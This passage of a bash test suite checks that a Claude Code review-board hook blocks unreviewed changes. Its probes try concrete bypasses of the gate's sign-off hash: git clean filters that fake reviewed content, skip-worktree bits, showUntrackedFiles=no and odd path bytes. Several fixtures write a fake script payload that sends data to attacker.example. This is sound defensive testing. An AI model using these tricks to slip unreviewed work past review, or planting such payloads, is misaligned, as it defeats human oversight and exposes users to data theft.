h1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
printf '<div role="dialog" aria-modal="true">changed</div>\n' > "$d/hidden.svelte"
h2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
if [ -n "$h1" ] && [ "$h1" != "$h2" ]; then
  ok "a rendered file hidden by a single-file ignore rule moves the hash"
else
  no "a rendered file hidden by a single-file ignore rule moves the hash" "hash unchanged ($h1 -> $h2)"
fi
rm -rf "$d"

# A `filter.<name>.clean` command, wired to a path via .gitattributes,
# transforms content before git computes ANY diff -- including inside the
# throwaway index this reads. `--no-ext-diff --no-textconv` on the diff
# below guards external diff drivers and textconv; neither touches
# filter.*.clean, and there is no `--no-filters` to ask git diff for the
# untransformed comparison. A clean command that reconstructs whatever was
# last reviewed, regardless of the real bytes on disk, makes the diff (and
# so the hash) report no change while the file is completely different.
# Two steps, same shape as the symlink and gitlink probes above: sign off
# on a real edit, THEN wire the filter and rewrite, so the probe proves a
# REWRITE goes undetected rather than merely that a first edit is unreviewed.
d=$(new_repo) || exit 1
printf '<h1>v0</h1>\n' > "$d/src/routes/+page.svelte"
git -C "$d" add -A >/dev/null 2>&1 && git -C "$d" commit -qm v0 >/dev/null 2>&1
git -C "$d" rev-parse HEAD > "$d/.claude/.review-board-state/last-cleared"
printf '<h1>v1 real reviewed content</h1>\n' > "$d/src/routes/+page.svelte"
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
nuke=$(mktemp) || exit 1
{
  printf '#!/bin/sh\n'
  printf 'cat > /dev/null\n'
  printf 'printf %s\n' "'<h1>v1 real reviewed content</h1>\n'"
} > "$nuke"
chmod +x "$nuke"
git -C "$d" config "filter.nuke.clean" "$nuke"
printf '*.svelte filter=nuke\n' >> "$d/.git/info/attributes"
printf '<div role="dialog" aria-modal="true">rewritten, unreviewed</div>\n' > "$d/src/routes/+page.svelte"
out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh <<<"$GATE_STDIN" 2>&1)
printf '%s' "$out" | grep -q "clean filter" &&
  ok "a rewrite hidden behind a clean filter is not silently cleared" ||
  no "a rewrite hidden behind a clean filter is not silently cleared" "gate allowed"
rm -f "$nuke"
rm -rf "$d"

# waiver_forbidden_paths used to discard WALK_TRUNCATED_SENTINEL with
# `grep -vxF` instead of refusing on it, silently proceeding with whatever
# walk_hidden_dir enumerated up to the cap -- so a forbidden component
# sorting past the cap could sit outside the truncated slice with nothing
# raised. Externally-ignored (`.git/info/exclude`, not `.gitignore`) so
# ignore_source_is_external forces __external=1 unconditionally and this
# reaches the fixed enumerator regardless of file content -- an in-tree
# rule instead only ever exercises compute_work_hash's OWN separate cap
# check further down the same command, which would mask this gap entirely.
d=$(new_repo) || exit 1
mkdir -p "$d/lab"
for i in $(seq 1 800); do echo x > "$d/lab/file_$i.txt"; done
printf '<div role="dialog" aria-modal="true">forbidden</div>\n' > "$d/lab/zzz.svelte"
printf 'lab/\n' >> "$d/.git/info/exclude"
# Asserts "Cannot waive:" specifically, not just "hides more than": compute_
# work_hash runs its OWN independent cap check right after, over the same
# git-status-ignored directory regardless of __external classification, and
# its "Cannot sign off: ... hides more than" message would match a looser
# grep even with THIS fix reverted -- proving only the redundant downstream
# catch, not this one. "Cannot waive:" only prints when waiver_forbidden_
# paths itself sets WORK_ERROR, before compute_work_hash ever runs.
out=$(signoff "$d" --waive --grounds formatting-only --reason "nothing renders" 2>&1)
printf '%s' "$out" | grep -q "^Cannot waive:.*hides more than" &&
  ok "a waiver over a truncated ignored directory refuses rather than under-counting" ||
  no "a waiver over a truncated ignored directory refuses rather than under-counting" "did not refuse via waiver_forbidden_paths: $out"
rm -rf "$d"

# The clean-filter check first read from the REAL index (`git ls-files -z`),
# so an UNTRACKED path carrying the attribute was invisible to it --
# work in flight is usually untracked at sign-off time, which made this the
# commoner shape, not the rarer one.
d=$(new_repo) || exit 1
nuke=$(mktemp) || exit 1
{
  printf '#!/bin/sh\n'
  printf 'cat > /dev/null\n'
  printf 'printf %s\n' "'<h1>never actually reviewed</h1>\n'"
} > "$nuke"
chmod +x "$nuke"
git -C "$d" config "filter.nuke.clean" "$nuke"
printf '*.svelte filter=nuke\n' >> "$d/.git/info/attributes"
printf '<div role="dialog" aria-modal="true">never reviewed, all untracked</div>\n' > "$d/src/routes/+page.svelte"
out=$(signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor 2>&1)
printf '%s' "$out" | grep -q "clean filter" &&
  ok "an untracked path with a clean filter is not silently signed off" ||
  no "an untracked path with a clean filter is not silently signed off" "signed off: $out"
rm -f "$nuke"
rm -rf "$d"

# `git check-attr --stdin -z filter | tr '\0' '\n'` desyncs the moment any
# TRACKED path -- not necessarily the attacked one -- contains a literal
# newline byte, which is a legal git path: the NUL boundaries stay intact in
# `-z` output, but converting them to newlines turns the embedded byte into
# an extra record boundary and misaligns every (path, attr, value) triple
# after it. A decoy path elsewhere in the tree is enough to blind the check
# to the real attack.
# The decoy must SORT BEFORE the attacked path in `git ls-files -z` output
# (`!` is byte 0x21, before `+` at 0x2B, so `!decoy` precedes `+page.svelte`)
# -- corruption from a desynced triple only affects entries AFTER the point
# where alignment is lost, so a decoy sorting after the target proves
# nothing (confirmed: that shape stayed green even with the NUL-safety fix
# fully reverted). And the decoy and target both need to be part of an
# ALREADY-REVIEWED baseline, with only the malicious rewrite outstanding --
# otherwise the gate blocks anyway because the decoy itself is new
# unreviewed work, which looks like a pass without proving the filter
# attack was actually caught.
d=$(new_repo) || exit 1
printf '<h1>v0</h1>\n' > "$d/src/routes/+page.svelte"
decoy_dir="$d/src/routes/!decoy/$(printf 'x\ny')"
mkdir -p "$decoy_dir"
echo decoy > "$decoy_dir/d.txt"
git -C "$d" add -A >/dev/null 2>&1 && git -C "$d" commit -qm v0 >/dev/null 2>&1
printf '<h1>v1 real reviewed content</h1>\n' > "$d/src/routes/+page.svelte"
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
nuke=$(mktemp) || exit 1
{
  printf '#!/bin/sh\n'
  printf 'cat > /dev/null\n'
  printf 'printf %s\n' "'<h1>v1 real reviewed content</h1>\n'"
} > "$nuke"
chmod +x "$nuke"
git -C "$d" config "filter.nuke.clean" "$nuke"
printf '*.svelte filter=nuke\n' >> "$d/.git/info/attributes"
printf '<div role="dialog" aria-modal="true">rewritten, unreviewed</div>\n' > "$d/src/routes/+page.svelte"
out=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-gate.sh <<<"$GATE_STDIN" 2>&1)
printf '%s' "$out" | grep -q "clean filter" &&
  ok "a newline-containing decoy path does not blind the clean-filter check" ||
  no "a newline-containing decoy path does not blind the clean-filter check" "gate allowed: $out"
rm -f "$nuke"
rm -rf "$d"

# The same `status.showUntrackedFiles=no` shape, on the LINKED WORKTREE
# guard rather than the gitlink one -- set inside the worktree's own
# per-worktree config (not the main checkout's), it makes THAT worktree's
# `git status --porcelain` report clean while an entirely untracked,
# unreviewed component sits right there.
d=$(new_repo) || exit 1
wt=$(mktemp -d) || exit 1
rm -rf "$wt"
git -C "$d" branch wtbranch >/dev/null 2>&1
git -C "$d" worktree add "$wt" wtbranch -q >/dev/null 2>&1
git -C "$wt" config status.showUntrackedFiles no
printf '<div role="dialog" aria-modal="true">never reviewed</div>\n' > "$wt/Sneaky.svelte"
expect_block "$d" "a linked worktree with showUntrackedFiles=no still blocks on new content"
git -C "$d" worktree remove "$wt" --force >/dev/null 2>&1
rm -rf "$wt"
rm -rf "$d"

# `status.showUntrackedFiles=no` set INSIDE an embedded repo's own config
# (not this repo's -- nothing here would ever see the setting itself) makes
# `git -C "$sm" status --porcelain` report clean while an entirely
# untracked, unreviewed component sits right there. No `.gitignore` needed.
d=$(new_repo) || exit 1
mkdir -p "$d/src/lib/vendor"
(cd "$d/src/lib/vendor" && git init -q && printf '<h1>v1</h1>\n' > V.svelte \
  && git add -A && git commit -qm v && git config status.showUntrackedFiles no) >/dev/null 2>&1
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
printf '<div role="dialog" aria-modal="true">never reviewed</div>\n' > "$d/src/lib/vendor/Sneaky.svelte"
expect_block "$d" "an embedded repo with showUntrackedFiles=no still blocks on new content"
rm -rf "$d"

# An embedded repo's own COMMITTED .gitignore hides content from its status
# entirely regardless of showUntrackedFiles -- a different mechanism from
# the probe above, so both are needed. Piped through is_artifact on the
# fix side, so this must NOT fire on the embedded repo's own node_modules
# (the sanity half of this probe).
d=$(new_repo) || exit 1
mkdir -p "$d/src/lib/vendor"
(cd "$d/src/lib/vendor" && git init -q && printf 'ui/\n' > .gitignore \
  && echo r > README.txt && git add -A && git commit -qm v) >/dev/null 2>&1
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
mkdir -p "$d/src/lib/vendor/ui"
printf '<div role="dialog" aria-modal="true">no trap</div>\n' > "$d/src/lib/vendor/ui/Modal.svelte"
expect_block "$d" "a component hidden by an embedded repo's own .gitignore still blocks"
rm -rf "$d"

# Signed off with the gitlink and its node_modules already in place, THEN
# more content is added inside node_modules (an ordinary `bun install`
# shape) with nothing else in the reviewable diff changed -- same two-step
# structure as the probe above it, needed for the same reason: a brand new,
# never-reviewed gitlink always blocks regardless of what is inside it, so
# expect_allow needs a real signed-off baseline to assert against first.
d=$(new_repo) || exit 1
mkdir -p "$d/src/lib/vendor/node_modules/somepkg"
(cd "$d/src/lib/vendor" && git init -q && printf 'node_modules/\n' > .gitignore \
  && echo r > README.txt && git add -A && git commit -qm v) >/dev/null 2>&1
echo x > "$d/src/lib/vendor/node_modules/somepkg/index.js"
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
echo y > "$d/src/lib/vendor/node_modules/somepkg/more.js"
expect_allow "$d" "an embedded repo's own node_modules does not brick the gate"
rm -rf "$d"

# Nothing in the suite pins the bash-3.2 parseability fix itself: every gate
# invocation above runs via `bash`, which resolves to a modern interpreter
# on this machine, so a reintroduced `case` inside `$( )` would leave every
# OTHER probe green while silently breaking the hook for anyone whose `bash`
# resolves to stock macOS 3.2. `bash -n` alone would not catch it either --
# that only proves the file parses on WHATEVER bash ran the check.
if [ -x /bin/bash ]; then
  if /bin/bash -n "$HOOKS_SRC/work-hash.sh" 2>/dev/null &&
     /bin/bash -n "$HOOKS_SRC/review-board-gate.sh" 2>/dev/null &&
     /bin/bash -n "$HOOKS_SRC/review-board-signoff.sh" 2>/dev/null; then
    ok "the hooks parse under /bin/bash (stock macOS 3.2)"
  else
    no "the hooks parse under /bin/bash (stock macOS 3.2)" "a syntax error under /bin/bash -n"
  fi
else
  no "the hooks parse under /bin/bash (stock macOS 3.2)" "/bin/bash not found on this machine -- cannot verify"
fi

# `git add -A -N` into a FRESH, empty throwaway index has no notion of what
# the real index already tracks, so a path matching `.gitignore` that was
# force-tracked (`git add -f`) is skipped entirely -- not staged as new,
# not staged as modified, simply absent, regardless of its content. Every
# diff built from that index reported such a path as "does not exist" no
# matter what it held: two commits force-adding completely DIFFERENT
# content to the same ignored, tracked path produced the IDENTICAL empty
# diff both times against baseline, a real hash collision rather than a
# mere omission -- neither state ever moved the hash. `tmp/` matches this
# repo's own unanchored ignore rule (same shape used elsewhere in this
# file), so `git add -f` on a path under it reproduces the exact case.
# `tmp/` must actually BE ignored before the force-add, or `git add -f` is a
# no-op on an already-trackable path and the fixture never reaches the bug
# at all -- `new_repo` sets up no default .gitignore, so this establishes
# one first, matching the shape used elsewhere in this file.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/src/routes/tmp"
printf '<h1>v1</h1>\n' > "$d/src/routes/tmp/+page.svelte"
git -C "$d" add -f src/routes/tmp/+page.svelte >/dev/null 2>&1
h1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/src/routes/tmp/+page.svelte"
git -C "$d" add -f src/routes/tmp/+page.svelte >/dev/null 2>&1
h2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
if [ -n "$h1" ] && [ -n "$h2" ] && [ "$h1" != "$h2" ]; then
  ok "a force-added ignored path does not hash-collide across different content"
else
  no "a force-added ignored path does not hash-collide across different content" "h1=[$h1] h2=[$h2]"
fi
rm -rf "$d"

# The probe above alone was not enough: `add_ignored_tracked`'s `git
# ls-files --cached --ignored --exclude-standard` came back plain (no `-z`,
# no `-c core.quotePath=false`), so a non-ASCII force-tracked ignored path
# is C-quoted on output and the subsequent `git add -f -N -- "$path"`
# matches nothing -- reopening the identical collision, silently, for any
# path outside ASCII. Same shape, one non-ASCII path segment.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/src/café/tmp"
printf '<h1>v1</h1>\n' > "$d/src/café/tmp/+page.svelte"
git -C "$d" add -f "src/café/tmp/+page.svelte" >/dev/null 2>&1
h1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/src/café/tmp/+page.svelte"
git -C "$d" add -f "src/café/tmp/+page.svelte" >/dev/null 2>&1
h2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
if [ -n "$h1" ] && [ -n "$h2" ] && [ "$h1" != "$h2" ]; then
  ok "a non-ASCII force-added ignored path does not hash-collide across different content"
else
  no "a non-ASCII force-added ignored path does not hash-collide across different content" "h1=[$h1] h2=[$h2]"
fi
rm -rf "$d"

# `-c core.quotePath=false` alone (no `-z`) only suppresses quoting for
# non-ASCII bytes -- git still C-quotes a `"`, `\`, control byte, or
# newline regardless of it. Three enumerations in this file used
# quotePath=false without -z on a LINE-based `git status --porcelain
# --ignored=matching` stream, so a quote character anywhere in the
# collapsed ignored-directory path corrupted the `sed -n 's/^!! //p'`
# extraction and the whole directory read as invisible -- a silent ALLOW
# on an unreviewed component, not even a refusal. `qu"ote/` as the ignore
# rule itself reproduces it: the collapsed line becomes `!! "src/routes/qu
# \"ote/"`, quoted end to end.
d=$(new_repo) || exit 1
(cd "$d" && printf 'qu"ote/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/src/routes/qu\"ote"
printf '<h1>v1</h1>\n' > "$d/src/routes/qu\"ote/+page.svelte"
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/src/routes/qu\"ote/+page.svelte"
expect_block "$d" "a quote character in an ignored path does not blind the hidden-directory scan"
rm -rf "$d"

# `git add -f -N -- "$__tp"` in add_ignored_tracked parses pathspec magic
# AFTER `--`, so a repo-relative path beginning with `:` (pathspec magic
# syntax -- e.g. a directory literally named `:magic`) matches no pathspec
# and is silently dropped, exit 128 into the swallowed `2>/dev/null` --
# the identical collision the function exists to close, reopened a third
# way (after non-ASCII and quote/control-byte).
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/:magic/tmp"
printf '<h1>v1</h1>\n' > "$d/:magic/tmp/+page.svelte"
git -C "$d" add -f -- './:magic/tmp/+page.svelte' >/dev/null 2>&1
h1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/:magic/tmp/+page.svelte"
git -C "$d" add -f -- './:magic/tmp/+page.svelte' >/dev/null 2>&1
h2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
if [ -n "$h1" ] && [ -n "$h2" ] && [ "$h1" != "$h2" ]; then
  ok "a colon-prefixed force-added ignored path does not hash-collide across different content"
else
  no "a colon-prefixed force-added ignored path does not hash-collide across different content" "h1=[$h1] h2=[$h2]"
fi
rm -rf "$d"

# Git's index is per-worktree and per-embedded-repo, so a
# `skip-worktree`/`assume-unchanged` bit set INSIDE a linked worktree (or
# an embedded gitlink) hides a modification from THAT repo's own status
# and diff the identical way it does for the outer repo -- and the outer
# repo's own index-bits check, at the top of compute_work_hash, only ever
# reads the outer repo's own index.
d=$(new_repo) || exit 1
printf '<h1>v1</h1>\n' > "$d/src/routes/Modal.svelte"
git -C "$d" add -A >/dev/null 2>&1 && git -C "$d" commit -qm v0 >/dev/null 2>&1
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
wt=$(mktemp -d) || exit 1
rm -rf "$wt"
git -C "$d" branch fix >/dev/null 2>&1
git -C "$d" worktree add "$wt" fix -q >/dev/null 2>&1
git -C "$wt" update-index --skip-worktree src/routes/Modal.svelte
printf '<div role="dialog" aria-modal="true">no focus trap</div>\n' > "$wt/src/routes/Modal.svelte"
expect_block "$d" "skip-worktree set inside a linked worktree still blocks"
git -C "$d" worktree remove "$wt" --force >/dev/null 2>&1
rm -rf "$wt"
rm -rf "$d"

# The gitlink twin of the probe above. Three independent review rounds
# found this arm existed in the code but had no discriminating fixture --
# deleting it failed no probe at all, even though it is exactly as
# load-bearing as the worktree arm and defends the identical shape of
# bypass one level deeper (an embedded repo, not a checked-out branch).
d=$(new_repo) || exit 1
mkdir -p "$d/src/lib/vendor"
(cd "$d/src/lib/vendor" && git init -q && printf '<h1>v1</h1>\n' > Modal.svelte \
  && git add -A && git commit -qm v) >/dev/null 2>&1
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
git -C "$d/src/lib/vendor" update-index --skip-worktree Modal.svelte
printf '<div role="dialog" aria-modal="true">no focus trap</div>\n' > "$d/src/lib/vendor/Modal.svelte"
expect_block "$d" "skip-worktree set inside an embedded gitlink still blocks"
rm -rf "$d"

# A file whose name contains a literal newline byte cannot be represented
# by walk_hidden_dir's own newline-terminated output without corruption --
# it would split across what every caller reads as two "lines", losing its
# own directory prefix, and drop out of the hash silently. Reproduces one
# layer below the quote-character probe above: git status collapses the
# whole `tmp/` subtree to one (newline-free) line, so the byte is only
# reachable once walk_hidden_dir expands that directory's own contents.
#
# NOT an expect_block-on-first-addition probe: with the guard genuinely
# absent, a first-time addition still moves the hash to SOME different
# value (still new work, still correctly blocked) and a naive version of
# this probe stayed green with the fix fully reverted -- caught by testing
# a REWRITE instead, matching the other collision probes above. And NOT a
# hash-inequality check like those probes either: unlike the quote/colon/
# non-ASCII fixes, which compute a correct, DIFFERENT hash for different
# content, this one refuses outright (WORK_ERROR set, WORK_HASH empty) --
# the fail-closed direction three review rounds asked for instead of a
# silent misread. Two empty hashes are trivially "equal", so this checks
# WORK_ERROR is set on both calls, not h1 != h2.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/src/routes/tmp/$(printf 'a\nb')"
printf '<h1>v1</h1>\n' > "$d/src/routes/tmp/$(printf 'a\nb')/Modal.svelte"
e1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/src/routes/tmp/$(printf 'a\nb')/Modal.svelte"
e2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
if printf '%s' "$e1" | grep -q "newline" && printf '%s' "$e2" | grep -q "newline"; then
  ok "a newline in a hidden file's path refuses rather than silently dropping it"
else
  no "a newline in a hidden file's path refuses rather than silently dropping it" "e1=[$e1] e2=[$e2]"
fi
rm -rf "$d"

# The probe above only reaches walk_hidden_dir's newline guard: git status
# collapses a whole newly-ignored directory to one clean line before
# ignored_matching_paths ever sees it, so a newline in a FILE's name never
# reaches ignored_matching_paths's own separate guard. Reproduced here with
# the newline in the top-level IGNORED PATH ITSELF, which is the only shape
# that does reach it -- deleting ignored_matching_paths's own newline arm
# left the full suite green without this probe.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp*/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
nldir="src/routes/tmp"$'\n'"X"
mkdir -p "$d/$nldir"
printf '<h1>v1</h1>\n' > "$d/$nldir/Modal.svelte"
e1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/$nldir/Modal.svelte"
e2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
if printf '%s' "$e1" | grep -q "newline" && printf '%s' "$e2" | grep -q "newline"; then
  ok "a newline in the ignored path itself refuses rather than silently dropping it"
else
  no "a newline in the ignored path itself refuses rather than silently dropping it" "e1=[$e1] e2=[$e2]"
fi
rm -rf "$d"

# add_ignored_tracked's own `-z` read (fixed for non-ASCII in round 6, but
# never given a probe for the OTHER quoted-byte classes `-z` also fixes --
# `"`, `\`, control bytes) is unpinned: reverting just its NUL-safe reading
# back to plain `read -r` (keeping `-c core.quotePath=false`, which the
# function's own comment says does not reach these bytes) left the full
# suite green. A quote character in a FORCE-ADDED ignored path reproduces.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/tmp"
printf '<h1>v1</h1>\n' > "$d/tmp/qu\"ote.svelte"
git -C "$d" add -f -- './tmp/qu"ote.svelte' >/dev/null 2>&1
h1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/tmp/qu\"ote.svelte"
git -C "$d" add -f -- './tmp/qu"ote.svelte' >/dev/null 2>&1
h2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
if [ -n "$h1" ] && [ -n "$h2" ] && [ "$h1" != "$h2" ]; then
  ok "a quote character in a force-added ignored path does not hash-collide across different content"
else
  no "a quote character in a force-added ignored path does not hash-collide across different content" "h1=[$h1] h2=[$h2]"
fi
rm -rf "$d"

# `add_ignored_tracked`'s `git add -f -N` was run `>/dev/null 2>&1` with its
# exit status never checked -- every byte fix above (non-ASCII, quote/
# control-byte, colon-prefix pathspec magic) closes a way that ONE CALL can
# come back C-quoted or unmatched, but none of them checks whether the call
# itself simply failed for an unrelated reason (disk full, a permissions
# problem, git misbehaving). An unchecked failure there reopens the exact
# collision this function exists to close, in the fail-OPEN direction: the
# path stays absent from the throwaway index and two completely different
# bodies of the same force-tracked ignored file hash identically -- or, once
# fixed, both refuse. No filesystem condition here reproduces a `git add -f`
# failure without root or disk exhaustion, so this shims `git` on PATH to
# fail only that one subcommand+flag pair, passing every other invocation
# through to the real binary -- the same fault-injection shape harness-
# skeptic used to find this live in this round's review.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/tmp"
printf '<h1>v1</h1>\n' > "$d/tmp/+page.svelte"
git -C "$d" add -f -- tmp/+page.svelte >/dev/null 2>&1
git -C "$d" commit -qm "force-tracked ignored v1" >/dev/null 2>&1
fakebin=$(mktemp -d) || exit 1
cat > "$fakebin/git" <<'SHIM'
#!/bin/sh
if [ "$1" = "add" ] && [ "$2" = "-f" ]; then
  echo "fatal: shim refuses add -f" >&2
  exit 1
fi
exec /usr/bin/git "$@"
SHIM
chmod +x "$fakebin/git"
e1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" PATH="$fakebin:$PATH" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/tmp/+page.svelte"
git -C "$d" add -f -- tmp/+page.svelte >/dev/null 2>&1
e2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" PATH="$fakebin:$PATH" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
rm -rf "$fakebin"
if printf '%s' "$e1" | grep -q "could not stage" && printf '%s' "$e2" | grep -q "could not stage"; then
  ok "a failed git add -f on a force-added ignored path refuses rather than hash-colliding"
else
  no "a failed git add -f on a force-added ignored path refuses rather than hash-colliding" "e1=[$e1] e2=[$e2]"
fi
rm -rf "$d"

# The fix above hardened the LOOP BODY (`git add -f`) and left the loop's
# PRODUCER -- `git -c core.quotePath=false ls-files -z --cached --ignored
# --exclude-standard` -- with its own exit status unchecked. `$?` right
# after `done < <(...)` reads the WHILE loop's status, not the substituted
# command's, so a failing producer was invisible: the loop simply never
# iterates, no WORK_ERROR is set, and the force-tracked ignored path stays
# silently absent from the throwaway index -- the identical collision one
# line up from the one just fixed. Unlike every other probe in this
# function's section, this needs NO git-BINARY-level fault injection (no
# shim) -- but it DOES need a deterministic corruption of `.git/index`, and
# appending random bytes is NOT that: git's index format ends in optional
# "extension" records, each starting with a 4-byte signature whose first
# byte's case decides whether an unrecognized one is silently skipped with a
# warning (uppercase, 0x41-0x5A -- "ignoring XXXX extension", exit 0) or
# fatal (anything else -- "index uses xxxx extension, which we do not
# understand", exit 128). Appending past the index's own trailing checksum
# also means the "signature" git reads is really the first bytes of that
# PRE-EXISTING checksum, not the appended bytes themselves -- so whether the
# probe flaked depended on the content already in the repo's index, not on
# what was appended to it. Confirmed by sweeping all 256 possible leading
# checksum bytes against the real index format: exactly 26 -- the
# contiguous uppercase range 0x41-0x5A -- make `git ls-files` exit 0 instead
# of 128, i.e. 1 in 10 index states, so the probe flaked red on a healthy
# guard for roughly 1 in 5 full runs (each probe draws twice: 1 - (0.9)^2).
# A TRUNCATED index has no such escape hatch: it is short of
# even its own fixed-size header/checksum trailer, and `git ls-files`
# refuses deterministically (confirmed 40/40 trials on the real git binary)
# rather than reading a byte pattern that might parse as *something*. The
# minimum for a valid-looking index is 32 bytes (12-byte header + 20-byte
# checksum trailer, no entries) -- confirmed by truncating to 0, 1, 10, 11,
# 12, and 31 bytes (all refuse) versus exactly 32 (accepted as a valid, if
# empty, index). The 10 bytes used below is comfortably under that boundary;
# do not raise it anywhere near 32 without re-verifying the margin.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
mkdir -p "$d/tmp"
printf '<button>Open</button>\n' > "$d/tmp/+page.svelte"
git -C "$d" add -f -- tmp/+page.svelte >/dev/null 2>&1
git -C "$d" commit -qm "force-tracked ignored v1" >/dev/null 2>&1
cp "$d/.git/index" "$d/.git/index.bak"
head -c 10 "$d/.git/index" > "$d/.git/index.trunc" && mv "$d/.git/index.trunc" "$d/.git/index"
e1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
cp "$d/.git/index.bak" "$d/.git/index"
printf '<script>fetch("https://attacker.example/steal")</script>\n' > "$d/tmp/+page.svelte"
git -C "$d" add -f -- tmp/+page.svelte >/dev/null 2>&1
head -c 10 "$d/.git/index" > "$d/.git/index.trunc" && mv "$d/.git/index.trunc" "$d/.git/index"
e2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_ERROR"')
if printf '%s' "$e1" | grep -q "could not list tracked-but-ignored paths" && printf '%s' "$e2" | grep -q "could not list tracked-but-ignored paths"; then
  ok "a corrupt index during add_ignored_tracked's own enumeration refuses rather than hash-colliding"
else
  no "a corrupt index during add_ignored_tracked's own enumeration refuses rather than hash-colliding" "e1=[$e1] e2=[$e2]"
fi
rm -rf "$d"

# `review-board-gate.sh`'s own `git rev-parse --git-dir >/dev/null 2>&1 ||
# exit 0` conflated "genuinely not a git repository" (the one case where
# silently doing nothing is correct) with "git failed for ANY reason" --
# every OTHER error path in this same file was converted to `emit_block` in
# this body of work, but this one line kept its bare `|| exit 0` and only
# grew a comment claiming the narrower meaning. A `git` shim that fails only
# `rev-parse --git-dir`, for a reason that has nothing to do with being
# outside a repository, reproduces the fail-open: an unreviewed
# `role="dialog"` component in a real repo cleared the gate with no output
# at all. The fix matches on git's own "not a git repository" message rather
# than trusting any nonzero exit to mean the same thing.
d=$(new_repo) || exit 1
